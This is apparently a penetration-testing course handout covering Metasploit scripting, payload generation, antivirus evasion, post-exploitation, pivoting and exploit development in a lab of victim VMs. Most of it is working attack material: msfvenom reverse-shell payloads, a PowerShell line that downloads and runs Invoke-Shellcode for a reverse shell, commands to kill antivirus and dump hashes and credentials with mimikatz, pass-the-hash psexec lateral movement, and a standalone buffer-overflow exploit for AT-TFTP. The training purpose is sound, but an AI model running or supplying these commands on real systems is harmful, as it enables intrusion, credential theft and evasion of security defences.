C:\Windows\system32> reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system  /v LocalAccountTokenFilterPolicy  /t REG_DWORD  /d  1
 
 
 
###########################################
# Chapter 3: Custom Meterpreter Scripting #
###########################################
 
 
- In this lab we will be looking at how you can use some custom Meterpreter scripts to do more than what Metasploit
 
can offer.  This will also show you the flexibility of the Meterpreter scripts.
 
- We're going to start off with a simple Hello World script first.  
 
   
echo 'print_status("Hello World")' > /home/strategicsec/toolz/metasploit/scripts/meterpreter/helloworld.rb
 
 
- This next portion is up to you, exploit your test box and end up with a Meterpreter shell.
 
- Lets test out our helloworld.rb Meterpreter script.
 
 
meterpreter> run helloworld
 
 
- So far so good, now we can build on this base.  Lets add a couple more API calls to the script.
 
- Open /home/strategicsec/toolz/metasploit/scripts/meterpreter/helloworld.rb in your favorite and add following
 
line.
vi /home/strategicsec/toolz/metasploit/scripts/meterpreter/helloworld.rb
 
 
print_error("this is an error!")
print_line("this is a line")
 
- Now run the script:
 
meterpreter> run helloworld
 
 
- Now that we have the basics down, we're going to do something a little more exciting.  
- The architecture to follow when creating these scripts goes as follows:
 
def getinfo(session)
        begin
            <stuff goes here>
        rescue ::Exception => e
            <stuff goes here>
        end
end
 
 
- Copy and paste the following code into our helloworld.rb script:
 
def getinfo(session)
    begin
       sysnfo = session.sys.config.sysinfo
       runpriv = session.sys.config.getuid
       print_status("Getting system information ...")
       print_status("The target machine OS is #{sysnfo['OS']}")
       print_status("The computer name is #{'Computer'} ")
       print_status("Script running as #{runpriv}")
    rescue ::Exception => e
      print_error("The following error was encountered #{e}")
   end
end
 
getinfo(client)
 
 
 
- Now run the script:
 
meterpreter> run helloworld
 
 
- We can expand it by adding actual system commands to the script, lets look at how we can do this.
 
 
def list_exec(session,cmdlst)
    print_status("Running Command List ...")
    r=''
    session.response_timeout=120
    cmdlst.each do |cmd|
       begin
          print_status "running command #{cmd}"
          r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
          while(d = r.channel.read)
 
             print_status("#{d}")
          end
          r.channel.close
          r.close
       rescue ::Exception => e
          print_error("Error Running Command #{cmd}: #{e.class} #{e}")
       end
    end
 end
 
commands = [ "set",
    "ipconfig  /all",
    "arp -a"]
 
list_exec(client,commands)
 
 
 
- Run the script:
 
meterpreter> run helloworld
 
 
 
 
 
 
################################################
# Chapter 4: Writing Meterpreter Resource Files #
################################################
 
 
- In this lab we are going to create a binary payload via msfpayload then craft a .rc file that automates the
process to setup the multi handler listener.
 
- We will start off by creating the msfvenom
 
sudo /sbin/iptables -F
    strategicsec
 
cd ~/toolz/metasploit
 
./msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=192.168.153.164 -f exe > /home/strategicsec/Desktop/meterpreter.exe
 
sudo chmod 777 /home/strategicsec/Desktop/meterpreter.exe
 
- In the syntax above, we set the payload, set the local host address to connect back too, then redirected the
malicious payload to our desktop by issuing the correct path. We will also change the permissions on it to 777 just
to make it easy for us to use WinSCP to copy it over to our Win7 machine.
 
- Next we are going to create a .rc (resource file) file that will automate the process for setting up a listener.
 
- Navigate to the /home/strategicsec/toolz/metasploit/ so that when you create the .rc file you can save it in the
working directory.
 
 
- Type 'touch meterpreter.rc' to create the file.
touch meterpreter.rc
 
- Type 'echo use exploit/multi/handler  >> meterpreter.rc' to be appended to the .rc file.
echo use exploit/multi/handler  >> meterpreter.rc
 
- Type 'echo set PAYLOAD windows/meterpreter/reverse_tcp  >> meterpreter.rc' to be appended to the .rc file.
echo set PAYLOAD windows/meterpreter/reverse_tcp  >> meterpreter.rc
 
- Type 'echo set LHOST 192.168.153.164>> meterpreter.rc' to be appended to the .rc file.
echo set LHOST 192.168.153.164>> meterpreter.rc
 
- Type 'echo exploit -j -z >> meterpreter.rc' to be appended to the .rc file.
echo exploit -j -z >> meterpreter.rc
 
- Then cat the meterpreter.rc out to verify that everything in the file looks ok.
cat meterpreter.rc
 
Now at the command prompt, type 'sudo ./msfconsole -r meterpreter.rc' to start the msfconsole module and call/run
 
the 'meterpreter.rc' file.
./msfconsole -r meterpreter.rc
 
- Once the msfconsole starts, the meterpreter resource file is executed and the listener is automatically setup.  It is now listening for a connection!
 
- Now you must transfer the malicious meterpreter payload to the victim machine (you may do so by any means necessary, we have physical access so we transferred it via usb.
 
- Click on the payload and create the meterpreter session.
 
- Type 'sessions -l' to list your open sessions, and 'sessions -i 1' to indicate that you want to interact with
 
meterpreter session under id 1.
 
exit -y
       
 
 
 
***********************************
* Getting Serious About .rc files *
***********************************
 
 
touch /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
 
echo run getcountermeasure >> /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
 
echo run winenum >> /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
 
echo run post/windows/gather/enum_applications >> /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
 
echo run post/windows/gather/enum_logged_on_users >> /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
 
echo run post/windows/gather/checkvm >> /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
 
 
 
- Ok, that was fun. Now let's take a quick look at the .rc file we just created.
cat /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
 
 
 
 
touch /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
 
 
echo use exploit/windows/browser/ie_cgenericelement_uaf >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
 
echo set ExitOnSession true >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
 
echo set URIPATH /ie8 >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
 
echo set PAYLOAD windows/meterpreter/reverse_tcp >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
 
echo set LHOST 192.168.153.164 >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc                            
 
           
 
echo set AutoRunScript multi_console_command -rc /home/strategicsec/toolz/metasploit/autorun-walk-through.rc >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
 
echo exploit -j -z >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
 
 
 
- Ok, that was more fun than the previous one. Now let's take a quick look at the .rc file we just created.
cat /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
 
cat /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
 
- Alright, enough already. Let's run this thing.
./msfconsole -r old-faithful-ie8.rc
 
 
 
 
 
#################################
# Chapter 5: Anti-Virus Evasion #
#################################
------------------------------------------------------------
- Now it is time to work on some anti-virus evasion. Veil is the new tool on the scene for AV evasion.
sudo pip install PyInstaller
        strategicsec
 
cd /home/strategicsec/toolz/Veil-Evasion/setup
 
sudo ./setup.sh
        /home/strategicsec/toolz/metasploit/            (when it asks for the path to Metasploit)
 
cd /home/strategicsec/toolz/Veil-Evasion/
 
sudo python Veil-Evasion.py
 
update
 
clean
 
y
 
list
 
info 5
 
use 5
 
set LHOST 192.168.230.128
 
info
 
generate
 
        payload         (when it asks for a base name)
 
exit
 
sudo mv /usr/share/veil-output/compiled/payload.exe /home/strategicsec/            (my file path for payload.exe might be different)
 
sudo chmod 777 /home/strategicsec/payload.exe
 
cd ~/toolz/metasploit
 
./msfconsole  -r /usr/share/veil-output/handlers/payload_handler.rc
 
 
- From your Win7 host use WinSCP to copy test.exe from the Ubuntu host to your Win7 desktop.
- double click test.exe and see if you get a Meterpreter session
 
 
 
use exploit/windows/local/ask
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.230.128                                            (Make sure you change this to your ubuntu ip address)
set LPORT 7799
exploit
 
 
meterpreter > getuid
Server username: win7-64-victim\Workshop
meterpreter > getsystem
...got system (via technique 1).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
 
meterpreter> ps
 
meterpreter> migrate 2110                                       (Make sure this process is running as: NT AUTHORITY\SYSTEM
 
meterpreter> run killav
 
meterpreter> run post/windows/gather/hashdump
 
meterpreter> run post/windows/gather/credentials/credential_collector
 
meterpreter > load mimikatz
 
meterpreter > kerberos
 
meterpreter > background
 
exit -y
 
 
 
 
 
 
###########################################
# Section 3: Tunneling For Fun and Profit #
###########################################
 
*****************************Enumerate the network you are on ***************************
 
meterpreter > run netenum
 
meterpreter > run netenum -ps -r 192.168.153.0/24
 
meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.153.0/24
 
 
 
********************************** Set up your Pivot **********************************
 
meterpreter > background
                                                        <-- background the session
        You want to get back to this prompt:
        msf exploit(handler) > back                     <--- you need to get to main msf> prompt
 
 
 
        sessions -l                                     <--find a session you want to pivot through (note the IP and session number)
       
        Now set up Pivot with a route add
        ---------------------------------
 
route print
 
route add 192.168.153.163 255.255.255.0 1                       <-- Use correct session id (2), it may be 3, or 4 (make sure you are on msf> prommpt, not meterpreter)
 
 
route print                                             <----- verify new route
 
******************************Scan through your Pivot ******************************
 
use auxiliary/scanner/portscan/tcp                      <-- Run aux modules through your pivot
 
set THREADS 10
 
set RHOSTS 192.168.153.0/24             <-- Keep changing this IP and re-running the scan until you find something you want to attack
 
set PORTS 445
 
run
 
 
************************* Lateral movement through your Pivot *************************
 
-- Option 1:
use exploit/windows/smb/psexec
 
set RHOST 192.168.153.163
 
set LPORT 2345
 
set SMBUser Workshop
 
set SMBPass password
 
exploit
 
 
 
 
-- Option 2:
use exploit/windows/smb/psexec
 
set SMBUser Workshop
 
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
 
set payload windows/meterpreter/reverse_tcp
 
set RHOST 192.168.153.163                      
 
set LHOST 192.168.153.164
 
set LPORT 5678
 
exploit
 
 
 
-- Option 3:
background
use auxiliary/admin/smb/upload_file
 
set SMBUser Workshop
 
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
 
set LPATH /home/strategicsec/binaries/wce.exe
 
set RPATH "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\wce.exe"
 
set RHOST 192.168.153.163                      
 
run
 
 
 
-- Option 4:
use auxiliary/admin/smb/upload_file
 
set SMBUser Workshop
 
set SMBPass password
 
set LPATH /home/strategicsec/binaries/wce.exe
 
set RPATH "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\wce.exe"
 
set RHOST 192.168.153.163                      
 
run
 
 
-- Option 5:
use exploit/multi/handler
set ExitOnSession false
set payload windows/meterpreter/reverse_https
set LHOST 192.168.153.164
set LPORT 4443
set EXITFUNC thread
exploit -j
 
 
 
sessions -i 1
shell
powershell -command "IEX (New-Object Net.WebClient).DownloadString('https://s3.amazonaws.com/StrategicSec-Files/Powersploit/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.153.164 -Lport 4443 -Force"
 
 
####################################
# Socks Tunneling with Proxychains #
####################################
--- Open a duplicate putty session to your Ubuntu host
 
sudo apt-get install -y proxychains
    strategicsec
 
sudo vi /etc/proxychains.conf                           <--- Make sure that last line of the file is: socks4  127.0.0.1 1080
 
        Comment out the proxy_dns, change the 9050 (tor port) to the metasploit socks proxy port (1080) and save it.
        socks4  127.0.0.1 1080
 
***************************Set up a Socks Proxy through your Pivot *************************
 
 
use auxiliary/server/socks4a
 
set SRVHOST 127.0.0.1
 
set SRVPORT 1080
 
run
 
        --- Go back to your other putty session with the meterpreter shell
cd ~
 
proxychains nmap -sT -PN -vv -sV --script=smb-os-discovery.nse -p 445 192.168.153.0/24          <--- This is going to be really slow
 
proxychains nmap -sT -PN -n -sV -p 21,22,23,25,80,110,139,443,1433,1521,3306,3389,8080,10000 192.168.153.0/24           <--- This is going to be really slow
 
 
        ---close the duplicate putty session to your Ubuntu host
 
 
 
 
##################
# Day 2 Homework #
##################
Please take screenshots of you doing videos 11-20 in this playlist
https://www.youtube.com/playlist?list=PL1512BD72E7C9FFCA
 
Please take screenshots of you doing all of the steps in section 3 of this pastebin
 
##################################
# Section 4: Exploit Development #
##################################
 
###############################################
# Chapter 9: Porting an exploit to Metasploit #
###############################################
 
***********************************************
* Vulnerable Server Versus Fuzzer and Company *
***********************************************
 
 
- Inside of your Windows7 VM - download the following file to the Desktop:
https://s3.amazonaws.com/StrategicSec-Files/SimpleExploitLab.zip
 
- Extract this zip file to your Desktop
 
- Go to folder C:\Users\Workshop\Desktop\ExploitLab\2-VulnServer, and run vulnserv.exe
 
- Open a new command prompt and type:
nc localhost 9999
 
- In the new command prompt window where you ran nc type:
HELP
 
- Go to folder C:\Users\Workshop\Desktop\ExploitLab\4-AttackScripts
- Right-click on 1-simplefuzzer.py and choose the option edit with notepad++
 
- Now double-click on 1-simplefuzzer.py
- You'll notice that vulnserv.exe crashes. Be sure to note what command and the number of As it crashed on.
 
 
- Restart vulnserv, and run 1-simplefuzzer.py again. Be sure to note what command and the number of As it crashed
 
on.
 
- Now go to folder C:\Users\Workshop\Desktop\ExploitLab\3-OllyDBG and start OllyDBG. Choose 'File' -> 'Attach' and
 
attach to process vulnserv.exe
 
- Go back to folder C:\Users\Workshop\Desktop\ExploitLab\4-AttackScripts and double-click on 1-simplefuzzer.py.
 
- Take note of the registers (EAX, ESP, EBP, EIP) that have been overwritten with As (41s).
 
- Now isolate the crash by restarting your debugger and running script 2-3000chars.py
 
- Calculate the distance to EIP by running script 3-3000chars.py
- This script sends 3000 nonrepeating chars to vulserv.exe and populates EIP with the value: 396F4338
 
4-count-chars-to-EIP.py
- In the previous script we see that EIP is overwritten with 396F4338 is 8 (38), C (43), o (6F), 9 (39)
- so we search for 8Co9 in the string of nonrepeating chars and count the distance to it
 
5-2006char-eip-check.py
- In this script we check to see if our math is correct in our calculation of the distance to EIP by overwriting EIP
 
with 42424242
 
6-jmp-esp.py
- In this script we overwrite EIP with a JMP ESP (6250AF11) inside of essfunc.dll
 
7-first-exploit
- In this script we actually do the stack overflow and launch a bind shell on port 4444
 
8 - Take a look at the file vulnserv.rb and place it in your Ubuntu host via SCP or copy it and paste the code into
 
the host.
 
 
------------------------------
 
cd /home/strategicsec/toolz/metasploit/modules/exploits/windows/misc
 
vi vulnserv.rb
 
 
 
cd ~/toolz/metasploit
 
./msfconsole
 
 
 
use exploit/windows/misc/vulnserv
set PAYLOAD windows/meterpreter/bind_tcp
set RHOST 192.168.153.163
set RPORT 9999
exploit
 
 
 
 
 
 
 
#########################################
# Chapter 12: Shellcoding with MSFVenom #
#########################################
 
 
-No shellcoding walk-through can be considered complete without covering Metasploit’s MSFPayload replacement
msfvenom.
 
-If you have never used msfvenom, the first thing you should do is read the help menu and memorize some of these
flags:
 
-Example 1: If you wish to list all the payloads available, you can do the following (also the same for listing
encoders, nops, or all):
 
./msfvenom -l payloads  
 
 
- Example 2: Generating a windows/meterpreter/reverse_tcp:
./msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP -f exe
 
 
- Example 3: To generate a payload that avoids certain bad characters:
./msfvenom -p windows/meterpreter/bind_tcp -b '\x00'  msfv
 
 
- Example 4: To generate a payload with a specific encoder, and then encode 3 times:
./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3  
 
-Example 5: Inject a payload to calc.exe, and save it as new.exe
 
./msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -k -f exe > new.exe  
 
 
 
- msfvenom is a combination of Msfpayload and Msfencode, putting both of these tools into a single Framework instance.
 
-Note: msfvenom has replaced both msfpayload and msfencode as of June 8th, 2015.
 
-The advantages of msfvenom are:
One single tool
Standardized command line options
Increased speed
Msfvenom has a wide range of options available:
 
-MSFvenom command line usage
-You can see an example of the msfvenom command line below and its output:
-The msfvenom command and resulting shellcode above generates a Windows bind shell with three iterations of the
 
-shikata_ga_nai encoder without any null bytes and in the python format.
 
 
 
-Here is a list of available formats that you can use
 
-MSFvenom options and uses
 
msfvenom -v or –var-name
 
-Usage: -v, –var-name <name>
-Specify a custom variable name to use for certain output formats. Assigning a name will change the output’s variable
 
-from the default “buf” to whatever word you supplied.
-Default output example:
 
 
 
msfvenom -n, –nopsled
 
-You will occasionally need to add a few NOPs at the start of your payload. This will place a nopsled of [length]
size at the beginning of your payload.
 
msfvenom –smallest
 
-If the “smallest” switch is used, msfvenom will attempt to create the smallest shellcode possible using the
selected encoder and payload.
 
msfvenom -c, –add-code
 
-Specify an additional win32 shellcode file to include, essentially creating a two (2) or more payloads in one (1)
shellcode.
 
-Payload #1:
 
-Adding payload #2:
 
-Adding payload #3:
 
-Running the “cookies.exe” file will execute both message box payloads, as well as the bindshell using default
settings (port 4444).
 
msfvenom -x, –template & -k, –keep
 
-The -x, or –template, option is used to specify an existing executable to use as a template when creating your
executable payload.
-Using the -k, or –keep option in conjunction will preserve the template’s normal behavior and have your injected
payload run as a separate thread.
 
- Creating Metasploit Payloads
 
-Often one of the most useful (and to the beginner underrated) abilities of Metasploit is the msfpayload module.
Multiple payloads can be created with this module and it helps something that can give you a shell in almost any
situation. For each of these payloads, you can go into msfconsole and select exploit/multi/handler. Run ‘set
payload’ for the relevant payload used and configure all necessary options (LHOST, LPORT, etc). Execute and wait for
the payload to be run. For the examples below it’s pretty self explanatory but LHOST should be filled in with your
IP address (LAN IP if attacking within the network, WAN IP if attacking across the internet), and LPORT should be
the port you wish to be connected back on.
 
- List payloads
 
msfvenom -l
 
- Binaries
 
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.153.164 LPORT=4444 -f elf > shell.elf
 
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.153.164 LPORT=4444 -f exe > shell.exe
 
- Mac
msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.153.164 LPORT=7777 -f macho > shell.macho
 
- PHP
 
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.153.164 LPORT=7777 -f raw  > shell.php
 
 
Scripting Payloads
- Python
msfvenom -p cmd/unix/reverse_python LHOST=192.168.153.164 LPORT=4444 -f raw > shell.py
 
 
- Bash
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.153.164 LPORT=4444 -f raw > shell.sh
 
 
- Perl
msfvenom -p cmd/unix/reverse_perl LHOST=192.168.153.164 LPORT=4444 -f raw > shell.pl
 
-Shellcode
 
-For all shellcode options see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output
code that is able to be cut and pasted in this language for your exploits.
 
- Linux Based Shellcode
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.153.164 LPORT=7777 -f python
 
- Windows Based Shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.153.164 LPORT=7777 -f python
 
- Mac Based Shellcode
msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.153.164 LPORT=4444 -f python
 
-Handlers
-Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming
shells. Handlers should be in the following format.
 
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.153.164
set LPORT 4444
set ExitOnSession false
exploit -j
 
-Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘
 
 
 
 
 
#######################################################################
# Chapter 13: Converting Metasploit Exploits to a Stand Alone Exploit #
#######################################################################
 
 
 
Sometimes you might want to have a stand alone exploit, but the only option out there is a Metasploit module. Sure
you could always just fire up Metasploit and use it… but what fun would that be? Besides it’s great to understand
what’s going on under the hood of the Metasploit modules for both getting a handle on writing your own exploits and
in the future even writing your own Metasploit modules and contributing back to the fantastic project.
Requirements
 
●     Windows XP – SP3 Virtual Machine (Victim).
●     StrategicSec Virtual Machine (Attacker).
●     Allied Telesyn TFTP Server 1.9 (Available here:   http://netsec.ws/wp-content/downloads/at-tftpd19.exe).
●     A willingness to give things a go.
 
 
-The Target
 
-We’re going to be adapting the attftp_long_filename.rb module located at
-/home/strategicsec/toolz/metasploit/modules/exploits/windows/tftp/attftp_long_filename.rb and changing it into our
own stand alone Python exploit. I’m by no means an experienced exploit writer so this is something that I’ve hacked
together and figured out myself, there may be more optimal ways of doing each step. Full credit must be given to
‘patrick’ the original author of the module along with prop’s to c0re since we’re pulling out his return address.
attftp_long_filename.rb
 
 
-Key Points
 
-Let’s run through some key points of the module and try and understand it a little better. Only parts that have an
impact on our exploit will be examined.
 
 
-Default Exit Options
 
-As noted above, the default exit function is ‘process’. This the method in which the shellcode will exit after
running and typically has an impact on how stable the vulnerable program will be after we send our exploit. This
value should be noted for when we alter the shellcode used to suit our particular situation.
 
-Payload
 
 
-The payload is one of the key aspects we need to examine. This states that we have 210 bytes of space for our
payload to reside in. Any larger and we may possibly run into issues of corruption or truncation of our exploit. Bad
characters signify bytes that may impact our exploit. We need to ensure none of these characters are in our
shellcode, and in this case it’s the almost universally bad null character ‘0x00′. For more information on bad
characters search this site for writing basic buffer overflows. Finally, we see something called stack adjustment.
Essentially because we’re so restricted in space we need to utilize something called a staged payload. What we’re
doing is only sending a small first instruction which is designed to connect back to us and get the main payload,
which wouldn’t regularly fit. Because of this we need to adjust the stack pointer back 3500 bytes so it has room to
actually write the payload without overwriting itself.
 
-Targets
 
 
-Metasploit has a wide variety of targets for many exploits, which really is mostly a wide variety of suitable return
addresses for each operating system. Because they are often using system DLLs, these addresses are not changed from
computer to computer and ensures exploit compatibility. In our case, we wish to use the return address donated by
c0re, Windows XP SP3.
 
 
-The Exploit
 
 
-The main part all the rest has been leading up to, the exploit itself. Let’s go through it line by line to ensure we
understand.
 
-connect_udp
 
 
 
-This signifies that the exploit will be sent over UDP packets. This line connects sets the target as the values in
 
-Metasploit such as RHOST and RPORT.
 
-sploit = "\x00\x02" +....
 
-The exploit is started with two hex values, ‘0x00′ and ‘0x02′ followed by a series of NOPs. The nops component is going to be variable in length depending on the length of your LAN IP, but always totaling 25 in total. As an example the LHOST value of ‘192.168.1.2’ has a length of 11, while an IP address of ‘192.168.100.123’ has a length of 15. If you want to play around with this fire up IRB (Interactive Ruby Shell) and assign a variable such as LHOST = ‘192.168.1.50’. The command LHOST.length will then tell you the length value – or just count how many characters
there are including periods.
 
-sploit << payload.encoded
 
 
 
-This line encodes the payload specified within Metasploit and encodes it in the required format. Metasploit will internally determine what payloads are suitable given the space available and the target operating system, and they can be viewed with the ‘show payloads’ command. When we say ‘required format’ it means that it will exclude the nominated bad characters earlier in the exploit.
 
 
-sploit << [target['RET']].pack('V')
 
 
-This command will append the target return address into the exploit string. It’s presented as a variable here because within Metasploit you can nominate different operating systems, but for our purposes it will just be the Windows XP SP3 return address. The pack ‘V’ command signifies that it needs to be packed in little endian format, necessary for x86 processors.
 
-sploit << "x88\xc4\x28\xc3"
 
-Translated into commands, this is instructing the esp register to add 40 bytes and return. Necessary to position esp correctly for our exploit.
 
-sploit<< "\x00" + "netascii" + ...
 
-The final string of our exploit, this terminates the data stream in a format AT-TFTP is expecting.
-udp_sock.put(sploit)
 
 
-This instructs Metasploit to send the exploit via UDP.
 
disconnect_udp
 
 
-Self-explanatory but this signifies it has finished with the UDP socket.
-Adapting Each Part
 
-Let’s summarize what we need to achieve in our own exploit for it to get working based on the above, highlighted
areas.
●     Create an appropriately sized NOP sled based off the size of LHOST
●     Nominate the return address and pack it in little endian format
●     Generate shellcode suitable for our situation (LHOST, etc)
●     Perform stack adjustment on the shellcode so our second stage can write correctly
●     Send the exploit over UDP with Python
 
About the only step in there which should sound a little challenging is this stack adjustment business, but really as with all things it’s a lot easier than it sounds.
 
-Let’s begin with a very bare bones UDP framework for sending information to the target.
 
#nano at-tftp.py
# AT-TFTP v1.9 Exploit
# Written for Strategic Security
import sys, socket
# Use in the form "python attftp_long_filename.py <IP Address> <Port> <Your IP Address>"
host = sys.argv[1]                          # Receive IP from user
port = int(sys.argv[2])                 # Receive Port from user
exploit = ""                                        # Out future exploit location
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Declare a UDP socket
client.sendto(exploit, (host, port))                                                        # Send the exploit
 
over UDP to the nominated addresses
 
 
 
-Now from here a lot of the information is going to be straight translations from the ruby counterparts. This includes creating the appropriate sized NOPs and the return address, along with the information we know will be sent to set up the exploit itself. Let’s incorporate that into our framework.
 
# AT-TFTP v1.9 Exploit
# Written for Strategic Security
import sys, socket
 
# Use in the form "python attftp_long_filename.py <Target IP Address> <Port> <Your IP
 
Address>"
host = sys.argv[1]                          # Receive IP from user
lhost = sys.argv[3]
port = int(sys.argv[2])                 # Receive Port from user
ret = "\x53\x93\x42\x7e"            # Return address - Source Metasploit (Little Endian)
nop = "\x90" * (25-len(lhost))  # Create a NOP string as to bring NOPs + LHOST up to 25 bytes
payload = ""                                    # Payload to be calculated
exploit = "\x00\x02" + nop + payload + ret + "\x83\xc4\x28\xc3\x00netascii\x00"     # Our exploit so far
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # Declare a UDP socket
client.sendto(exploit, (host, port))            # Send the exploit over UDP to the nominated
addresses
 
 
 
 
-Now we’ve got the known information we need to take the next step and factor in the stack adjustment for our staged payload.
 
 
-Stack Adjustment
 
-First we need to dump our payload into a raw hex file for further manipulation. Our payload, in this case, is going to be the meterpreter shell windows/meterpreter/reverse_nonx_tcp, chosen for it’s particularly small code footprint.
 
-We use the command,
 
./msfvenom -p windows/meterpreter/reverse_nonx_tcp LHOST=192.168.153.164 LPORT=4443 -a Windows -a x86 -o payload
 
 
 
-If we wish to confirm this has successfully outputted to the file we can use the command
 
#hexdump -C payload
 
 
-This will also come in handy when comparing the file against the post stack adjustment version. Next we need to find out what command we actually need to use to adjust the stack -3500 bytes.
This can be done using the Metasploit tool nasm_shell.rb, located here
 
/usr/share/metasploit-framework/tools/nasm_shell.rb.
 
-Putting in an assembly command will give you the hex machine instruction for that command. Since we want to subtract 3500 (0xDAC in hex) from the stack pointer we do the following,
Install nasm before proceeding to the next command
 
#sudo apt-get install nasm
#ruby /home/strategicsec/toolz/metasploit/tools/nasm_shell.rb
nasm > sub esp, 0xDAC
00000000  81ECAC0D0000      sub esp,0xdac
 
 
 
-This tells us we need to use the commands 81EC AC0D 0000 to achieve adjusting the stack by 3500. We output this into a raw hex file. You can do it however you wish, such as with a hex editor, but a quick one line example with Perl is as follows,
 
#perl -e 'print "\x81\xec\xac\x0d\x00\x00"' > stackadj
 
-We now have two raw files - stackadj and our payload. We want to combine them both together which is a simple cat command,
 
#cat stackadj payload > shellcode
 
-To confirm we now have the file in a correct format we once more examine it with hexdump and compare it against our previous dump.
 
# hexdump -C shellcode
 
 
 
-It’s exactly the same as our past payload but with the stack adjustment having taken place at the start of the exploit. We’re almost done now, but we have one final step we need to do to the shellcode.
 
Encoding Shellcode
 
-In both our stack adjustment command and the payload itself, there are null characters which we need to remove. Msfencode comes to our rescue once again and we can reencode the payload without nulls.
 
strategicsec@ubuntu:~/toolz/metasploit$ cat shellcode | sudo ./msfvenom -b '\x00' -e x86/shikata_ga_nai -a x86 --platform win -f python
 
 
 
We can now cut and paste this shellcode into our python exploit. The final exploits look like the below.
 
Final Stand Alone Exploit


-=-=-=-=-=-=-=-=-=-


Metasploit Next Level


##########################
# Download the attack VM #
##########################
https://s3.amazonaws.com/StrategicSec-VMs/StrategicsecUbuntu14.zip
user: strategicsec
pass: strategicsec

https://s3.amazonaws.com/StrategicSec-VMs/Strategicsec-XP-ED-Attack-Host.zip
user: strategicsec
pass: strategicsec
 

###########################
# Download the victim VMs #
###########################
https://s3.amazonaws.com/StrategicSec-VMs/Windows7.zip
user: workshop
pass: password

https://s3.amazonaws.com/StrategicSec-VMs/XPSP3-ED-Target.zip

user: administrator
pass: strategicsec





############################################################
# Section 1: Ruby Fundamentals and Metasploit Architecture #
############################################################

################################
# Chapter 1: Ruby Fundamentals #
################################



- Ruby is a general-purpose, object-oriented programming language, which was created by Yukihiro Matsumoto, a computer 
scientist and programmer from Japan. It is a cross-platform dynamic language.

- The major implementations of this language are Ruby MRI, JRuby, HotRuby, IronRuby, MacRuby, etc. Ruby 
on Rails is a framework that is written in Ruby.

- Ruby's file name extensions are .rb and .rbw. 

- official website of this 

- language: www.ruby-lang.org.


- interactive Shell called Ruby Shell


- Installing and Running IRB


sudo apt-get install ruby2,2,2 ruby2,2,2-dev irb rdoc ri


- open up the interactive console and play around.


irb



- Math, Variables, Classes, Creating Objects and Inheritance


#following arithmetic operators:
Addition operator (+) — 10 + 23
Subtraction operator (-) — 1001 - 34
Multiplication operator (*) — 5 * 5
Division operator (/) — 12 / 2



#Now let’s cover some variable techniques. In Ruby, you can assign a value to a variable using the assignment 
operator. ‘=’ is the assignment operator. In the following example, 25 is assigned to x. Then x is incremented by 
30. Again, 69 is assigned to y, and then y is incremented by 33.

x = 25
x + 30
y = 69
y+33




- Let’s look at creating classes and creating objects. 

- Here, the name of the class is Strategicsec. An object has its properties and methods.



class Attack
attr_accessor :of, :sqli, :xss
end

#Now that we have created the classes let’s create the objects

first_attack = Attack.new
first_attack.of = "stack"
first_attack.sqli = "blind"
first_attack.xss = "dom"
puts first_attack.of
puts first_attack.sqli
puts first_attack.xss





- Let’s work on some inheritance that will help make your programming life easier. When we have multiple classes, 
inheritance becomes useful. In simple words, inheritance is the classification of classes. It is a process by which 
one object can access the properties/attributes of another object of a different class. Inheritance makes your 
programming life easier by maximizing code reuse.



class Exploitframeworks
attr_accessor :scanners, :exploits, :shellcode, :postmodules
end
class Metasploit < Exploitframeworks
end
class Canvas < Exploitframeworks
end
class Coreimpact < Exploitframeworks
end
class Saint < Exploitframeworks
end
class Exploitpack < Exploitframeworks
end



 

- Methods, More Objects, Arguments, String Functions and Expression Shortcuts

- Let’s create a simple method. A method is used to perform an action and is generally called with an object.

- Here, the name of the method is ‘learning’. This method is defined inside the Msfnl class. When it is called, 
it will print this string: “We are Learning how to PenTest”

- An object named ‘bo’ is created, which is used to call the method.


	
class Msfnl
def learning
